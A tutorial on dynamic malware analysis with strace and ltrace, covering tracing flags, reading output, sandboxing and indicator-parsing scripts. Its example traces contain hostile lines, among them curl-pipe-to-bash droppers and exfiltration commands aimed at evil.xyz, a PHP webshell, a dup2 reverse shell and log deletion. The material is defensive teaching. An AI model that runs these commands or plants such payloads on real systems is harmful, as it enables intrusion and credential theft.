System Call Tracing

Observe every kernel interaction of an unknown binary with strace and ltrace to reveal file access, network connections, child processes, and anti-debug tricks.

Overview

Every interaction between a program and the outside world passes through the kernel, and strace records all of them. Running an unknown binary under a tracer exposes its file access, network connections, and child processes without reading a single instruction. This article covers the flags that matter, how to read the output, and how to turn a trace into indicators.

Required Reading

  • System Calls - Linux system call reference: calling conventions, syscall table, categories
  • Processes - process lifecycle, forking, signals, and /proc interfaces

The Boundary

Every interaction between a user-space program and the outside world passes through the kernel. The kernel is the gatekeeper. A binary cannot read a file without open() and read() . It cannot connect to a network without socket() and connect() . It cannot spawn a child without clone() or fork() . It cannot write to memory it doesn't own without mmap() .

strace sits at this boundary. It intercepts every system call the target process makes and every signal it receives. It prints the syscall name, all arguments, and the return value - in human-readable form, with structs decoded. Running an unknown binary under strace reveals its complete runtime behavior without executing a single instruction of the binary's code yourself.

This is dynamic analysis at the interface layer - observing what the binary asks the kernel to do, not how it computes internally. For most malware reverse engineering, this is sufficient to understand the binary's behavior.

strace Fundamentals

$ strace ./unknown.bin

Output (truncated):

execve("./unknown.bin", ["./unknown.bin"], 0x7ffd12345678 /* 35 vars */) = 0
brk(NULL)                               = 0x555555568000
arch_prctl(ARCH_SET_FS, 0x555555568540) = 0
openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 2234
close(3)                                = 0
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("185.234.72.18")}, 16) = 0
send(3, "system_info: Linux hostname 6.8.0"..., 256, 0) = 256
recv(3, "cat /etc/shadow\n", 4096, 0)    = 16
openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 4
read(4, "root:$6$abc123..."..., 4096)   = 1024
send(3, "root:$6$abc123..."..., 1024, 0) = 1024
exit_group(0)                           = ?

Every system call with its arguments and return value. The binary's behavior is completely exposed:

  1. It reads /etc/passwd (user enumeration).
  2. It opens a TCP socket and connects to 185.234.72.18:4444 ( C2 connection).
  3. It sends system info (hostname, kernel version - reconnaissance).
  4. It receives the command cat /etc/shadow from C2 .
  5. It opens and reads /etc/shadow (credential theft).
  6. It sends the shadow file contents back to C2 .

This is a credential stealer. Confirmed by the syscall trace alone.

Essential strace Flags

Process Hierarchy: -f, -ff

Malware spawns child processes. A dropper executes the real payload. A botnet uses fork for concurrency. Without -f , strace only traces the initial process: 

$ strace -f ./dropper.bin

-f follows fork() , vfork() , and clone() . Every child process appears inline with its PID: 

[pid 12345] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|..., ...) = 12346
[pid 12346] execve("/tmp/.hidden/payload", ["/tmp/.hidden/payload"], ...) = 0
[pid 12346] openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = 3

strace -ff writes each process to a separate file: 

$ strace -ff -o trace_output ./forking_malware.bin
# Produces: trace_output.12345, trace_output.12346, trace_output.12347, ...
$ ls -la trace_output.*
trace_output.12345
trace_output.12346
trace_output.12347

Each file is a complete trace for one PID. Compare them side by side to understand the process tree: 

$ wc -l trace_output.*
  1204 trace_output.12345
   312 trace_output.12346
    15 trace_output.12347

PID 12345 is the parent (most syscalls = orchestrator). PID 12346 is the payload child. PID 12347 is a short-lived helper.

Syscall Filtering: -e trace=

A trace of a complex binary produces thousands of syscalls per second. Noise drowns out signal. Filter: 

$ strace -e trace=file ./unknown.bin

Categories:

-e trace=CATEGORY Syscalls Included
file open,openat,stat,read,write,close,unlink,rename,chmod,chown,mkdir,rmdir,creat,readlink,symlink,link,truncate,ftruncate,access,faccessat,fstat,lstat
process clone,fork,vfork,execve,execveat,exit,exit_group,wait4,waitid,getpid,getppid,gettid,kill,tgkill,ptrace
network socket,connect,bind,listen,accept,send,sendto,sendmsg,recv,recvfrom,recvmsg,shutdown,getsockname,getpeername,setsockopt,getsockopt
ipc pipe,pipe2,shmget,shmat,shmdt,semget,semop,msgget,msgsnd,msgrcv
signal sigaction,sigprocmask,sigreturn,rt_sigaction,rt_sigprocmask,rt_sigreturn,kill,tgkill
memory brk,mmap,mprotect,munmap,mremap,madvise,mlock,mlockall,munlock,mincore,remap_file_pages
desc read,write,dup,dup2,dup3,fcntl,close,pipe,select,poll,epoll_create,epoll_ctl,epoll_wait

Filter by specific syscall:

$ strace -e trace=open,openat,read,write,connect,socket,execve ./unknown.bin

This captures only the most informative syscalls for malware analysis.

Dumping I/O Data: -e read= and -e write=

Syscall arguments show pointers, not data. To see what data flows through specific file descriptors, dump the buffers: 

$ strace -e read=3 -e write=3 ./network_binary

This dumps the first 32 bytes of every read() and write() on file descriptor 3: 

read(3, "GET /c2/checkin.php?id=ABC123 H"..., 256) = 256
 | 00000  47 45 54 20 2f 63 32 2f  63 68 65 63 6b 69 6e 2e  GET /c2/checkin. |
 | 00010  70 68 70 3f 69 64 3d 41  42 43 31 32 33 20 48 54  php?id=ABC123 HT |
write(3, "HTTP/1.1 200 OK\r\nContent-Lengt"..., 512) = 512
 | 00000  48 54 54 50 2f 31 2e 31  20 32 30 30 20 4f 4b 0d  HTTP/1.1 200 OK. |

The binary performs an HTTP GET to /c2/checkin.php with a hardcoded ID ( ABC123 ). This is the C2 heartbeat protocol.

To watch all descriptors:

$ strace -e trace=read,write -e read=all -e write=all ./unknown.bin

Produces massive output, but sometimes necessary.

Timestamp and Duration: -t, -T

$ strace -t ./unknown.bin
15:22:45 openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3
15:22:45 read(3, "root:x:0:0:..."..., 4096) = 2234
15:30:12 connect(3, {sa_family=AF_INET, ...}, 16) = 0

The five-minute gap between reading /etc/passwd and connecting tells you: the binary does local work first, then phones home. A sleep() call between operations - intentional delay to evade sandbox timeouts. 

$ strace -T ./unknown.bin
connect(3, {sa_family=AF_INET, ...}, 16) = 0 <0.000145>
recv(3, "", 4096, 0)                     = 0 <30.012478>

The recv() took 30 seconds. The C2 server was slow, or the connection timed out. Duration spikes indicate network latency, disk I/O bottlenecks, or intentional delays.

File Descriptor Paths: -y

$ strace -y ./unknown.bin
openat(AT_FDCWD, "/dev/null", O_WRONLY) = 3</dev/null>
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4<TCP:[114760]>
connect(4<TCP:[114760]>, {sa_family=AF_INET, ...}, 16) = 0

-y resolves file descriptors to paths or socket details. FD 3 is /dev/null . FD 4 is a TCP socket. No need to cross-reference /proc/self/fd manually.

Stack Trace on Syscall: -k

$ strace -k ./unknown.bin
openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 3
 > /lib/x86_64-linux-gnu/libc.so.6(__open+0x3e) [0x11be4e]
 > /home/user/malware/unknown.bin(steal_credentials+0x4f) [0x4020a0]
 > /home/user/malware/unknown.bin(main+0x29) [0x401050]
 > /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0x8a) [0x532a]

Each syscall has a kernel stack trace attached. This shows exactly which function in the binary triggered the syscall. For stripped binaries, this bridges the gap: you know that offset 0x4020a0 is the credential-stealing function because it opened /etc/shadow .

Analyzing strace Output

open/openat - File Access

Every file the binary touches:

$ strace -e trace=open,openat ./unknown.bin
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 4
openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = 5
openat(AT_FDCWD, "/home/user/.bash_history", O_RDONLY) = 6
openat(AT_FDCWD, "/tmp/.exfil.tar.gz", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 7

The binary reads /etc/shadow , SSH private keys, and .bash_history - then writes to /tmp/.exfil.tar.gz . This is exfiltration. The tar.gz is staged for upload.

What to look for in open calls:

Path Pattern What It Means
/etc/passwd,/etc/shadow Credential theft
/home/*/.ssh/ SSH key theft
/home/*/.bashrc,/home/*/.profile Persistence via shell modification
/proc/self/maps Self-inspection (anti-debug, unpacking)
/proc/*/cmdline Process enumeration
/tmp/.hidden_* Staging for exfiltration, lock files
/dev/mem,/dev/kmem Raw memory access (rootkit behavior)
/var/log/ Log tampering
.bash_history,.mysql_history History file theft
~/.aws/credentials,~/.config/gcloud/ Cloud credential theft

connect/sendto - Network Connections

$ strace -e trace=socket,connect,sendto,send,recv,recvfrom ./unknown.bin
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("185.234.72.18")}, 16) = 0
send(3, "BOT|hostname|cpu_count|4|os|Linux 6.8.0"..., 128, 0) = 128
recv(3, "SCAN 192.168.1.0/24:22\n", 4096, 0) = 24

C2 connection: IP 185.234.72.18 , port 4444. The initial beacon includes hostname, CPU count, and OS version. The C2 responds with a scan command: port 22 across the local subnet. This is a botnet node performing lateral movement.

For malware, watch for: - Outbound connections to non-standard ports : C2 servers use high ports (4444, 8080, 31337, 5555) to avoid detection. - Multiple connection attempts : Failover C2 infrastructure - the binary tries IP s in sequence. - DNS resolution before connect : The binary resolves a domain, then connects to the resolved IP . - UDP traffic (sendto/recvfrom) : P2P botnet communication, DDoS coordination, or DNS exfiltration.

execve - Child Process Creation

$ strace -f -e trace=execve ./unknown.bin
[pid 12345] execve("./unknown.bin", ["./unknown.bin"], ...) = 0
[pid 12346] execve("/bin/sh", ["/bin/sh", "-c", "curl http://evil.xyz/dropper.sh | bash"], ...) = 0
[pid 12348] execve("/usr/bin/curl", ["curl", "http://evil.xyz/dropper.sh"], ...) = 0

The binary spawns /bin/sh -c "curl http://evil.xyz/dropper.sh | bash" . This is a dropper

  • it downloads and executes a second-stage payload. The child PIDs reveal a process tree:
the main binary forks a shell, which forks curl. The pipe ( | bash ) means the downloaded script executes immediately.

What to look for in execve calls:

Executed Command Behavior
/bin/sh -c "..." Shell execution (dropper, reverse shell)
curl ... \| bash Remote script execution
wget ... -O /tmp/... Download payload
chmod +x /tmp/... Making payload executable
/tmp/.hidden/... Executing dropped payload
iptables -A ... Firewall manipulation
useradd ... Account creation for persistence
crontab - Scheduled task persistence
nohup ... & Background execution

write - Data Exfiltration

$ strace -e trace=write ./unknown.bin
write(3, "POST /upload.php HTTP/1.1\r\nHost: c2-server.xyz\r\n"..., 256) = 256
write(3, "root:$6$rounds=5000$salt$hash\n"..., 128) = 128
write(3, "ssh-rsa AAAAB3NzaC1yc2E...\n"..., 2048) = 2048
write(5, "<?php system($_GET['cmd']); ?>\n"..., 32) = 32

Three flows: 1. HTTP POST to /upload.php (exfiltration endpoint).

  1. The contents of /etc/shadow sent over the socket.
  2. An SSH key sent over the socket.
  3. FD 5: a PHP webshell written to a local path - the binary drops a backdoor.

read - Suspicious Input

$ strace -e trace=read ./unknown.bin
read(3, "\x7fELF\x02\x01\x01\x00..."..., 65536) = 65536

Reading an ELF header from a socket - the binary receives a new executable payload from C2 and loads it into memory. 

$ strace -e trace=read ./unknown.bin
read(5, "\x90\x90\x90\x90\x48\x31\xc0\x48\x31\xff..."..., 4096) = 256

NOP sled followed by x86-64 instructions. This is shellcode being read for execution.

ptrace - Anti-Debugging

$ strace -f -e trace=ptrace ./unknown.bin
ptrace(PTRACE_TRACEME, 0, NULL, NULL) = 0

ptrace(PTRACE_TRACEME) is the canonical anti-debug trick. A process can only be traced by one tracer at a time. If the binary traces itself ( PTRACE_TRACEME ), any debugger attempting to attach receives EBUSY . If ptrace fails (because a debugger already traced it), the binary knows it is being debugged and exits.

The binary also checks its own ptrace status before executing critical code:

ptrace(PTRACE_TRACEME, 0, NULL, NULL) = -1 EPERM (Operation not permitted)

If the return value is -1 EPERM , the binary is already being traced - debugger detected. The binary typically calls exit(0) immediately after this check.

Clone - Thread Creation

$ strace -f -e trace=clone ./unknown.bin
clone(child_stack=0x7f1234567000, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, ...) = 12346

Threads share address space (CLONE_ VM ), file descriptors (CLONE_FILES), and signal handlers (CLONE_SIGHAND). A multi-threaded malware binary uses threads for concurrent operations: one thread for C2 communication, one for keylogging, one for file encryption.

Contrast with fork() : 

clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, ...) = 12346

No CLONE_ VM - separate address space. This is a process fork, not a thread. The child gets its own memory, its own file descriptor table, and typically calls execve() to replace itself with a new program.

Interpreting Errors

$ strace -e trace=open,openat ./unknown.bin
openat(AT_FDCWD, "/root/.ssh/id_rsa", O_RDONLY) = -1 EACCES (Permission denied)
openat(AT_FDCWD, "/opt/secret_key.pem", O_RDONLY) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/var/run/docker.sock", O_RDONLY) = 3

Each error is a capability probe: - EACCES on /root/.ssh/id_rsa : The binary tried to steal root's SSH key. It lacks permissions. This tells you the binary runs as non-root and targets privilege escalation. - ENOENT on /opt/secret_key.pem : The binary looks for a known file. If it finds it, the behavior changes. This is an environment-specific payload.

  • Success on /var/run/docker.sock or /run/podman/podman.sock : The binary accessed a container runtime socket - it will try to escape the container.

Network connection errors:

connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("185.234.72.18")}, 16) = -1 ENETUNREACH (Network is unreachable)
connect(3, {sa_family=AF_INET, sin_port=htons(4445), sin_addr=inet_addr("10.0.1.50")}, 16) = -1 ETIMEDOUT (Connection timed out)
connect(3, {sa_family=AF_INET, sin_port=htons(4446), sin_addr=inet_addr("127.0.0.1")}, 16) = 0

The binary has three C2 addresses. It tries them sequentially. The first is unreachable (no route), the second times out (firewall block), the third succeeds (localhost

  • a backconnect listener). This is C2 failover logic.

Practical Malware Analysis Scenarios

Scenario 1: Ransomware

$ strace -f -e trace=file,process -o ransomware.trace ./suspicious.bin
$ cat ransomware.trace
openat(AT_FDCWD, "/home/user/Documents/report.docx", O_RDONLY) = 3
read(3, "PK\x03\x04..."..., 65536) = 45782
write(4, "\x00\x01\x02..."..., 45782) = 45782
rename("/home/user/Documents/report.docx", "/home/user/Documents/report.docx.encrypted") = 0
unlink("/home/user/Documents/report.docx") = 0
...

The binary: opens a file, reads it, writes encrypted data to a new file, renames the original with a .encrypted extension, then deletes the original. This is ransomware encryption. The .encrypted extension is the IoC. The sequential access pattern (iterate all user files) is visible in the open/read/write sequence.

Scenario 2: Reverse Shell Botnet

$ strace -f ./botnet_sample.bin
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("1.2.3.4")}, 16) = 0
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
execve("/bin/sh", ["/bin/sh", "-i"], ...) = 0

The binary connects to 1.2.3.4:1337 , then calls dup2() to redirect stdin (0), stdout (1), and stderr (2) to the socket. Then it exec's /bin/sh -i (interactive shell). The C2 server now has a fully interactive shell on the victim - stdin from C2 goes to bash, bash's output goes to C2 . This is a reverse shell. The dup2 calls are the giveaway.

Scenario 3: Fileless/Buffer-Only Payload

$ strace -e trace=network,memory ./buffer_only.bin
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
connect(3, {sa_family=AF_INET, ...}, 16) = 0
recv(3, "\x7fELF\x02\x01\x01\x00..."..., 131072) = 98304
mmap(NULL, 98304, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f1234560000
# ... copies received data to mmap'd region ...
mprotect(0x7f1234560000, 98304, PROT_READ|PROT_EXEC) = 0
# ... executes code at mmap'd address ...

The binary receives an ELF payload over the network, mmap s an RWX region, copies the payload there, changes permissions to RX, then branches to it. Nothing ever touches the filesystem. This is a fileless dropper - straight from network to memory to execution.

ltrace: Library Call Tracing

strace traces kernel syscalls. ltrace traces libc function calls - fopen() , system() , strcmp() , malloc() , popen() . These are user-space functions, not syscalls. 

$ ltrace ./unknown.bin
fopen("/etc/passwd", "r")                                  = 0x55555556a2a0
fread(0x7ffd1234, 1, 4096, 0x55555556a2a0)                = 2234
strstr("root:x:0:0:root:/root:/bin/bash", ":/bin/bash")    = ":/bin/bash"
system("curl http://evil.xyz/exfil -d @/tmp/data.tar.gz")  = 0
fclose(0x55555556a2a0)                                     = 0

libc functions reveal intent at a higher level than syscalls: - fopen("/etc/passwd", "r")

  • the binary explicitly opens the password file (not just any file at that path). - strstr() searching for :/bin/bash - it looks for accounts with bash shells (interactive login accounts).
  • system("curl ...") - it runs a shell command to exfiltrate data.

strace vs ltrace

Aspect strace ltrace
Layer Kernel (syscalls) User-space (library calls)
Scope Every kernel interaction libc and explicitly traced libraries
Binary required? No (uses ptrace) Yes (PLT/GOT needed for resolution)
Stripped binary? Works fully Limited - PLT still works
Packed binary? Works Packer stub only (real code unpacked at runtime)
Performance impact High (every syscall) Moderate
Output volume Very high Moderate
Data shown Full arguments + return values Arguments + return values (libc types)

Combining strace and ltrace

Run both simultaneously for complete coverage:

$ strace -o syscall.log ltrace -o library.log ./unknown.bin

Correlate the logs. A system("rm -rf /var/log/*") in ltrace maps to execve("/bin/sh", ["/bin/sh", "-c", "rm -rf /var/log/*"], ...) in strace. 

$ grep 'system' library.log | while read line; do
    echo "Library: $line"
done

Tracing A Running Process

If a process is already running (e.g., a daemonized malware), attach to it:

$ strace -p 12345

Attach and follow children:

$ strace -f -p 12345

To trace from the moment of attachment without disrupting existing connections:

$ strace -fp 12345 -e trace=network,file

Injecting Errors for Behavioral Analysis

strace can inject failures into specific syscalls to test the binary's error handling: 

$ strace -e inject=connect:error=ENETUNREACH ./unknown.bin

Every connect() call returns ENETUNREACH , regardless of actual network state. This reveals the binary's fallback behavior - does it try the next C2 ? Does it sleep and retry? Does it crash? 

$ strace -e inject=openat:error=EACCES ./unknown.bin

Every openat() returns EACCES . The binary cannot read any files. Observe how it handles this - does it exit cleanly? Does it attempt alternative paths?

Building an Analysis Sandbox

Combine strace with namespace isolation to create a safe execution environment:

$ podman run --rm -it \
    --name malware_sandbox \
    --network none \
    --cap-drop ALL \
    --cap-add SYS_PTRACE \
    --security-opt no-new-privileges \
    -v "$(pwd)/samples:/samples:ro" \
    archlinux:latest \
    strace -f -o /tmp/trace.log /samples/unknown.bin
  • --network none : No network access - C2 cannot connect, exfiltration is impossible.
  • --cap-drop ALL : Drop all capabilities - privilege escalation blocked.
  • --cap-add SYS_PTRACE : strace relies on ptrace, which the dropped set removes; add it back for the tracer only.
  • no-new-privileges : setuid binaries cannot gain privileges.
  • :ro (read-only volume): The binary cannot write to the host.

The trace output is saved inside the container ( /tmp/trace.log ). After execution, copy it out: 

$ podman cp malware_sandbox:/tmp/trace.log ./trace.log
$ podman rm malware_sandbox

strace Output Parser Script

Automate the extraction of key indicators from strace output:

#!/usr/bin/env python3
"""
parse_strace.py -- extract key indicators from strace output
Usage: strace -f -o trace.log ./unknown.bin
       python3 parse_strace.py trace.log
"""
import re
import sys
from collections import defaultdict


def parse_strace(filepath: str) -> dict:
    indicators = {
        'files_read': set(),
        'files_written': set(),
        'files_deleted': set(),
        'network_connections': set(),
        'network_listeners': set(),
        'child_processes': set(),
        'shell_commands': set(),
        'anti_debug': [],
        'mmap_exec': [],
        'errors': [],
    }

    with open(filepath) as f:
        for line in f:
            line = line.strip()

            # open/openat with paths
            m = re.search(r'open(at)?\([^,]+,\s*"([^"]+)",\s*([^)]+)\)', line)
            if m:
                path = m.group(2)
                flags = m.group(3)
                if 'O_RDONLY' in flags or 'O_RDWR' in flags:
                    indicators['files_read'].add(path)
                if 'O_WRONLY' in flags or 'O_RDWR' in flags or 'O_CREAT' in flags:
                    if path not in {'/dev/null', '/dev/urandom', '/dev/random'}:
                        indicators['files_written'].add(path)

            # unlink
            m = re.search(r'unlink(?:at)?\([^,]+,\s*"([^"]+)"', line)
            if m:
                indicators['files_deleted'].add(m.group(1))

            # rename
            m = re.search(r'rename\([^,]+,\s*"([^"]+)"', line)
            if m:
                indicators['files_written'].add(m.group(1))

            # Network connections
            m = re.search(r'connect\([^,]+,.*sin_port=htons\((\d+)\).*sin_addr=inet_addr\("([^"]+)"\)', line)
            if m:
                port = m.group(1)
                ip = m.group(2)
                indicators['network_connections'].add(f"{ip}:{port}")

            # Network listeners
            m = re.search(r'bind\([^,]+,.*sin_port=htons\((\d+)\).*sin_addr=inet_addr\("([^"]+)"\)', line)
            if m:
                port = m.group(1)
                ip = m.group(2)
                indicators['network_listeners'].add(f"{ip}:{port}")

            # execve
            m = re.search(r'execve\("([^"]+)",\s*\[([^\]]*)\]', line)
            if m:
                binary = m.group(1)
                args = m.group(2)
                if re.search(r'(/bin/sh|/bin/bash|sh|bash)', binary):
                    indicators['shell_commands'].add(args)

            # ptrace anti-debug
            if 'ptrace' in line and 'PTRACE_TRACEME' in line:
                indicators['anti_debug'].append(line)

            # mmap with PROT_EXEC
            if 'mmap' in line and 'PROT_EXEC' in line and 'PROT_WRITE' in line:
                indicators['mmap_exec'].append(line)

            # Errors
            if ' = -1 ' in line:
                m = re.search(r'(\w+)\(.* = -1 (\w+)', line)
                if m:
                    indicators['errors'].append(f"{m.group(1)}: {m.group(2)}")

    return indicators


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <strace_log>")

Challenge

Write a Go tool that parses an strace -f -o trace.log capture and prints three lists: the files opened, the network endpoints contacted, and the executables spawned. Run it on the trace of a shell that downloads and runs a script, then extend it to flag ptrace and PROT_EXEC mappings. 

package main

import (
	"bufio"
	"fmt"
	"os"
	"regexp"
)

var (
	reOpen    = regexp.MustCompile(`open(?:at)?\([^,]+, "([^"]+)"`)
	reConnect = regexp.MustCompile(`connect\([^,]+, \{sa_family=AF_INET, sin_port=htons\((\d+)\), sin_addr=inet_addr\("([^"]+)"\)`)
	reExec    = regexp.MustCompile(`execve\("([^"]+)"`)
)

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "usage: %s <trace.log>\n", os.Args[0])
		os.Exit(1)
	}

	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer file.Close()

	files := make(map[string]bool)
	conns := make(map[string]bool)
	execs := make(map[string]bool)

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()

		if match := reOpen.FindStringSubmatch(line); match != nil {
			files[match[1]] = true
		}
		if match := reConnect.FindStringSubmatch(line); match != nil {
			conns[match[2]+":"+match[1]] = true
		}
		if match := reExec.FindStringSubmatch(line); match != nil {
			execs[match[1]] = true
		}
	}

	fmt.Println("files:")
	for name := range files {
		fmt.Printf("  %s\n", name)
	}
	fmt.Println("connections:")
	for endpoint := range conns {
		fmt.Printf("  %s\n", endpoint)
	}
	fmt.Println("execs:")
	for name := range execs {
		fmt.Printf("  %s\n", name)
	}
}
